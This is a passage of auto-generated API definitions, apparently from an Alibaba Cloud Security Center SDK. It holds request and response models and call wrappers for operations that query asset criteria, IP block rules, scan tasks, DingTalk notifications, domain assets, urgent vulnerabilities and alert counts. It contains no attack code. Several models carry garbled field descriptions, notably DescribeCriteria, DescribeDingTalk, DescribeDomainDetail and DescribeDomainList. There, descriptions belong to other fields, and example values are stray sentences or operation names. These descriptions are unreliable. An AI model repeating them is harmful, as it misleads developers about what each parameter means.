model DescribeCountScannedImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCountScannedImageResponseBody(name='body'),
}

async function describeCountScannedImageWithOptions(runtime: Util.RuntimeOptions): DescribeCountScannedImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCountScannedImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCountScannedImage(): DescribeCountScannedImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCountScannedImageWithOptions(runtime);
}

model DescribeCriteriaRequest {
  machineTypes?: string(name='MachineTypes', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ecs'),
  supportAutoTag?: boolean(name='SupportAutoTag', description='Queries the filter conditions that are used to search for assets in fuzzy match mode.', example='true'),
  value?: string(name='Value', description='The attribute values of the assets that match the keyword.', example='47.96'),
}

model DescribeCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues', example='[{"vendor":0,"regionIds":{"default":["ap-southeast-1","ap-northeast-2","ap-southeast-3","ap-southeast-5","ap-southeast-7","me-central-1"]}},{"vendor":1,"regionIds":{"default":["outside-of-aliyun"]}}]'),
      name?: string(name='Name', example='internetIp'),
      type?: string(name='Type', example='input'),
      values?: string(name='Values', example='47.96.XX.XX'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', description='DescribeCriteria', example='8E6DDACF-99AF-5939-AFFD-FCCD3B01E724'),
}

model DescribeCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCriteriaResponseBody(name='body'),
}

async function describeCriteriaWithOptions(request: DescribeCriteriaRequest, runtime: Util.RuntimeOptions): DescribeCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.supportAutoTag)) {
    query['SupportAutoTag'] = request.supportAutoTag;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCriteria(request: DescribeCriteriaRequest): DescribeCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCriteriaWithOptions(request, runtime);
}

model DescribeCustomBlockRecordsRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to block by using the defense rule.', example='117.66.XX.XX'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='1'),
}

model DescribeCustomBlockRecordsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='708'),
  }(name='PageInfo', description='The pagination information.'),
  recordList?: [ 
    {
      blockExpireDate?: long(name='BlockExpireDate', description='The timestamp when the defense rule expires.', example='1671506882063'),
      blockIp?: string(name='BlockIp', description='The blocked IP address.', example='45.227.XX.XX'),
      bound?: string(name='Bound', description='The direction of the traffic that is sent by the blocked IP address. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in'),
      enableCount?: int32(name='EnableCount', description='The number of servers to which the defense rule is applied.', example='4'),
      id?: long(name='Id', description='The ID of the defense rule.', example='353376'),
      serverCount?: int32(name='ServerCount', description='The total number of servers on which the IP address is blocked.', example='6'),
      source?: string(name='Source', description='The source of the defense rule. Valid values:', example='UserRule'),
      status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='1'),
      targetList?: [ 
        {
          target?: string(name='Target', description='The ID of the server.', example='032b618f-b220-4a0d-bd37-fbdc6*******'),
          targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **uuid**: the ID of an asset', example='uuid'),
        }
      ](name='TargetList', description='An array consisting of the servers to which the defense rule is applied.'),
    }
  ](name='RecordList', description='An array that consists of the defense rules.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6B7T8Y'),
}

model DescribeCustomBlockRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCustomBlockRecordsResponseBody(name='body'),
}

async function describeCustomBlockRecordsWithOptions(request: DescribeCustomBlockRecordsRequest, runtime: Util.RuntimeOptions): DescribeCustomBlockRecordsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomBlockRecords',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCustomBlockRecords(request: DescribeCustomBlockRecordsRequest): DescribeCustomBlockRecordsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomBlockRecordsWithOptions(request, runtime);
}

model DescribeCycleTaskListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS\\_VUL\\_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG\\_VUL\\_SCHEDULE_SCAN**: urgent vulnerability scan task', example='IMAGE_SCAN'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS\\_VUL\\_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG\\_VUL\\_SCHEDULE_SCAN**: urgent vulnerability scan task', example='IMAGE_SCAN'),
}

model DescribeCycleTaskListResponseBody = {
  cycleScheduleResponseList?: [ 
    {
      configId?: string(name='ConfigId', description='The ID of the task configuration.', example='2cdbdeba8dd70586d5814d4cbf21****'),
      enable?: int32(name='Enable', description='Indicates whether the task is enabled. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
      firstDateStr?: long(name='FirstDateStr', description='The first time when the task starts.', example='1667491200000'),
      intervalPeriod?: int32(name='IntervalPeriod', description='The interval of the task.', example='3'),
      lastTaskId?: string(name='LastTaskId', description='The ID of the task when the task last runs.', example='38730bb078f4a1461d4ed283994c****'),
      nextStartTimeStr?: long(name='NextStartTimeStr', description='The next time when the task starts. The value is a UNIX timestamp. Unit: milliseconds.', example='1671184531000'),
      param?: string(name='Param', description='The additional information.', example='{"userAgreement":"yes","lang":"zh"}'),
      periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**: days
*   **hour**: hours', example='day'),
      targetEndTime?: int32(name='TargetEndTime', description='The period of time before the task ends. Unit: hours.', example='7'),
      targetStartTime?: int32(name='TargetStartTime', description='The period of time before the task starts for the next time. Unit: hours.', example='0'),
      taskName?: string(name='TaskName', description='The name of the task.', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', description='The type of the task.', example='IMAGE_SCAN'),
    }
  ](name='CycleScheduleResponseList', description='An array that consists of periodic scan tasks.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeCycleTaskListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCycleTaskListResponseBody(name='body'),
}

async function describeCycleTaskListWithOptions(request: DescribeCycleTaskListRequest, runtime: Util.RuntimeOptions): DescribeCycleTaskListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCycleTaskList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCycleTaskList(request: DescribeCycleTaskListRequest): DescribeCycleTaskListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCycleTaskListWithOptions(request, runtime);
}

model DescribeDingTalkRequest {
  currentPage?: int32(name='CurrentPage', description='The UID of the user.', example='1'),
  pageSize?: int32(name='PageSize', description='The pagination information.', example='20'),
  ruleActionName?: string(name='RuleActionName', description='The group IDs.', example='The language of the content within notifications. Valid values:

*   **zh**: Chinese
*   **en**: English'),
}

model DescribeDingTalkResponseBody = {
  actionList?: [ 
    {
      actionName?: string(name='ActionName', description='DescribeDingTalk'),
      aliUid?: long(name='AliUid', example='12312412341'),
      configList?: string(name='ConfigList', description='The modification time.', example='The ID of the request.'),
      dingTalkLang?: string(name='DingTalkLang', example='zh'),
      gmtCreate?: long(name='GmtCreate', description='Obtains DingTalk notifications.', example='1550828400000'),
      gmtModified?: long(name='GmtModified', example='1550828400000'),
      groupIdList?: string(name='GroupIdList', example='"123,456"'),
      id?: int32(name='Id', example='1'),
      intervalTime?: int32(name='IntervalTime', example='1000'),
      status?: int32(name='Status', description='The list of notification settings.', example='The number of entries returned per page.'),
      url?: string(name='Url', description='```
http(s)://[Endpoint]/?Action=DescribeDingTalk
&<公共请求参数>
```', example='https://oapi.dingtalk.com/robot/send'),
    }
  ](name='ActionList', description='An array that consists of details of notifications.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The ID of the notification.', example='1'),
    pageSize?: int32(name='PageSize', description='The name of the notification.', example='20'),
    totalCount?: int32(name='TotalCount', description='Alert notification', example='1'),
  }(name='PageInfo', description='The status of the notification. Valid values:

*   **0**: disabled
*   **1**: enabled'),
  requestId?: string(name='RequestId', description='[{\\"type\\":\\"vul\\",\\"configItemList\\":[{\\"key\\":\\"key\\", \\"valueList\\":\\"123\\"}]}]', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
}

model DescribeDingTalkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDingTalkResponseBody(name='body'),
}

async function describeDingTalkWithOptions(request: DescribeDingTalkRequest, runtime: Util.RuntimeOptions): DescribeDingTalkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleActionName)) {
    query['RuleActionName'] = request.ruleActionName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDingTalk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDingTalk(request: DescribeDingTalkRequest): DescribeDingTalkResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDingTalkWithOptions(request, runtime);
}

model DescribeDomainCountRequest {
  sourceIp?: string(name='SourceIp', example='192.172.XX.XX'),
}

model DescribeDomainCountResponseBody = {
  requestId?: string(name='RequestId', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
  rootDomainsCount?: int32(name='RootDomainsCount', example='5'),
  subDomainsCount?: int32(name='SubDomainsCount', example='5'),
  totalDomainsCount?: int32(name='TotalDomainsCount', example='10'),
}

model DescribeDomainCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainCountResponseBody(name='body'),
}

async function describeDomainCountWithOptions(request: DescribeDomainCountRequest, runtime: Util.RuntimeOptions): DescribeDomainCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainCount(request: DescribeDomainCountRequest): DescribeDomainCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainCountWithOptions(request, runtime);
}

model DescribeDomainDetailRequest {
  domainName?: string(name='DomainName', description='The domain name or the name of website that you want to query.

>  Fuzzy match is not supported. You must enter a complete domain name or a website.', example='example.com'),
  sourceIp?: string(name='SourceIp', description='The type of the domain asset. Valid values:

*   **0**: an Elastic Compute Service (ECS) instance
*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a Network Address Translation (NAT) gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance', example='1.2.XX.XX'),
}

model DescribeDomainDetailResponseBody = {
  alarmCount?: int32(name='AlarmCount', description='1.2.XX.XX', example='2'),
  domain?: string(name='Domain', description='The total number of alerts in your website assets.', example='example.com'),
  domainDetailItems?: [ 
    {
      assetType?: string(name='AssetType', example='0'),
      instanceId?: string(name='InstanceId', example='i-m5e6w7dzsktt6mz4***'),
      instanceName?: string(name='InstanceName', example='iZm5e6w7dzsktt6mz4yimeZ-6****'),
      internetIp?: string(name='InternetIp', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='1.2.XX.XX'),
      uuid?: string(name='Uuid', example='lb-bp1g9dohoyin9cjhn6****'),
    }
  ](name='DomainDetailItems', description='DescribeDomainDetail'),
  requestId?: string(name='RequestId', description='The instance UUID of the domain asset.', example='3A85CFCF-05C8-451A-9E41-C0D5E96BA407'),
  rootDomain?: string(name='RootDomain', description='Queries the details of domain assets within your Alibaba Cloud account.', example='example.com'),
  vulCount?: int32(name='VulCount', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2'),
}

model DescribeDomainDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainDetailResponseBody(name='body'),
}

async function describeDomainDetailWithOptions(request: DescribeDomainDetailRequest, runtime: Util.RuntimeOptions): DescribeDomainDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.domainName)) {
    query['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainDetail(request: DescribeDomainDetailRequest): DescribeDomainDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainDetailWithOptions(request, runtime);
}

model DescribeDomainListRequest {
  currentPage?: int32(name='CurrentPage', description='Queries the information about the domain assets within your Alibaba Cloud account.', example='1'),
  domainType?: string(name='DomainType', description='The number of entries returned per page. Default value: **10**.', example='root'),
  fuzzyDomain?: string(name='FuzzyDomain', description='The name of the domain or website.', example='sas'),
  pageSize?: int32(name='PageSize', description='The ID of the request, which is used to locate and troubleshoot issues.', example='10'),
  sourceIp?: string(name='SourceIp', description='The number of entries to return on each page. Default value: **10**.', example='192.122.XX.XX'),
}

model DescribeDomainListResponseBody = {
  domainListResponseList?: [ 
    {
      domain?: string(name='Domain', example='example.com'),
      ipList?: string(name='IpList', example='1.2.XX.XX,1.0.XX.XX'),
    }
  ](name='DomainListResponseList'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='10'),
    pageSize?: int32(name='PageSize', example='10'),
    totalCount?: int32(name='TotalCount', example='27'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', description='DescribeDomainList', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model DescribeDomainListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainListResponseBody(name='body'),
}

async function describeDomainListWithOptions(request: DescribeDomainListRequest, runtime: Util.RuntimeOptions): DescribeDomainListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.domainType)) {
    query['DomainType'] = request.domainType;
  }
  if (!Util.isUnset(request.fuzzyDomain)) {
    query['FuzzyDomain'] = request.fuzzyDomain;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainList(request: DescribeDomainListRequest): DescribeDomainListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainListWithOptions(request, runtime);
}

model DescribeEmgUserAgreementResponseBody = {
  auth?: boolean(name='Auth', example='true'),
  requestId?: string(name='RequestId', example='768BB9F5-8AF3-557F-A489-9BDD64CB3E4C'),
}

model DescribeEmgUserAgreementResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEmgUserAgreementResponseBody(name='body'),
}

async function describeEmgUserAgreementWithOptions(runtime: Util.RuntimeOptions): DescribeEmgUserAgreementResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeEmgUserAgreement',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEmgUserAgreement(): DescribeEmgUserAgreementResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEmgUserAgreementWithOptions(runtime);
}

model DescribeEmgVulItemRequest {
  checkType?: int32(name='CheckType', description='The check method. Valid values:

*   **0**: proof of concept (POC) verification
*   **1**: version comparison', example='0'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  riskStatus?: string(name='RiskStatus', description='Specifies whether the vulnerability poses risks.\\
If you do not specify this parameter, all vulnerabilities are queried regardless of whether the vulnerabilities pose risks. Valid values:

*   **y**: yes
*   **n**: no', example='y'),
  scanType?: string(name='ScanType', description='The method that is used to detect the vulnerability.\\
If you do not specify this parameter, all vulnerabilities are queried regardless of which method is used. Valid values:

*   **python**: The Version method is used. Security Center checks the software versions of your server to check whether disclosed vulnerabilities exist on your server.
*   **scan**: The Network Scan method is used. Security Center analyzes the access traffic to your server over the Internet to check whether vulnerabilities exist on your server.', example='python'),
  vulName?: string(name='VulName', description='The name of the urgent vulnerability.', example='Changjietong T + SetupAccount/Upload.aspx file Upload vulnerability (CNVD-2022-60632)'),
}

model DescribeEmgVulItemResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page **1**. Default value: **1**.', example='1'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The name of the urgent vulnerability.', example='Changjietong T + SetupAccount/Upload.aspx file Upload vulnerability (CNVD-2022-60632)'),
      checkType?: int32(name='CheckType', description='The check method.', example='1'),
      gmtLastCheck?: long(name='GmtLastCheck', description='The timestamp when the urgent vulnerability was last detected. Unit: milliseconds.', example='1619286031000'),
      gmtPublish?: long(name='GmtPublish', description='The timestamp when the vulnerability was disclosed. Unit: milliseconds.', example='1618887687000'),
      name?: string(name='Name', description='The name of the detection rule.', example='scan:AVD-2021-179344'),
      pendingCount?: int32(name='PendingCount', description='The number of unhandled urgent vulnerabilities.', example='0'),
      progress?: int32(name='Progress', description='The progress of the urgent vulnerability detection task. Valid values: 0 to 100.

> This parameter is returned only when an urgent vulnerability is being detected.', example='50'),
      status?: int32(name='Status', description='The detection status of the urgent vulnerability. Valid values:

*   **10**: The urgent vulnerability is not detected.
*   **20**: The urgent vulnerability is being detected.
*   **30**: The urgent vulnerability detection is complete.', example='30'),
      type?: string(name='Type', description='The method that is used to detect the urgent vulnerability. Valid values:

*   **python**: The Version method is used. Security Center checks the software versions of your server to check whether disclosed vulnerabilities exist on your server.
*   **scan**: The Network Scan method is used. Security Center analyzes the access traffic to your server over the Internet to check whether vulnerabilities exist on your server.', example='scan'),
    }
  ](name='GroupedVulItems', description='An array that consists of the urgent vulnerabilities returned.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BC1868ED-A0E1-4D1C-BF7E-10DC0C34B3C3'),
  totalCount?: int32(name='TotalCount', description='The total number of the urgent vulnerabilities returned.', example='1'),
}

model DescribeEmgVulItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEmgVulItemResponseBody(name='body'),
}

async function describeEmgVulItemWithOptions(request: DescribeEmgVulItemRequest, runtime: Util.RuntimeOptions): DescribeEmgVulItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.scanType)) {
    query['ScanType'] = request.scanType;
  }
  if (!Util.isUnset(request.vulName)) {
    query['VulName'] = request.vulName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEmgVulItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEmgVulItem(request: DescribeEmgVulItemRequest): DescribeEmgVulItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEmgVulItemWithOptions(request, runtime);
}

model DescribeEventLevelCountRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c7e3c5b420a7947c2933303144688****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers. If you specify multiple values, separate them with commas (,).', example='c951761046a9c4afe92be0a7b5bexxxxx'),
  containerIds?: string(name='ContainerIds', description='The ID of the container.', example='xxxxxx30389a10c28f6d38f2398f0dcexxxxxxx922b9e8290dc7c3019d4a8,48b87f2c0662e334820f436cb9133f1ae4e053d39b6fad42xxxxxxxxxx'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the asset', example='uuid'),
}

model DescribeEventLevelCountResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  eventLevels?: {
    remind?: int32(name='Remind', description='The number of alerts whose Emergency level is Reminder.', example='2'),
    serious?: int32(name='Serious', description='The number of alerts whose Emergency level is Urgent.', example='0'),
    suspicious?: int32(name='Suspicious', description='The number of alerts whose Emergency level is Suspicious.', example='1'),
  }(name='EventLevels', description='The statistics of alerts by risk level.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='CE8CA5EA-24EF-5D41-B735-53ACE7XXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeEventLevelCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEventLevelCountResponseBody(name='body'),
}

async function describeEventLevelCountWithOptions(request: DescribeEventLevelCountRequest, runtime: Util.RuntimeOptions): DescribeEventLevelCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.containerIds)) {
    query['ContainerIds'] = request.containerIds;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEventLevelCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEventLevelCount(request: DescribeEventLevelCountRequest): DescribeEventLevelCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEventLevelCountWithOptions(request, runtime);
}

model DescribeEventOnStageRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeEventOnStageResponseBody = {
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E332241XXXXX'),
  securityEventStageResponse?: {
    securityEventOnStag?: map[string]any(name='SecurityEventOnStag'),
  }(name='SecurityEventStageResponse'),
}

model DescribeEventOnStageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEventOnStageResponseBody(name='body'),
}

async function describeEventOnStageWithOptions(request: DescribeEventOnStageRequest, runtime: Util.RuntimeOptions): DescribeEventOnStageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEventOnStage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEventOnStage(request: DescribeEventOnStageRequest): DescribeEventOnStageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEventOnStageWithOptions(request, runtime);
}

model DescribeExcludeSystemPathRequest {
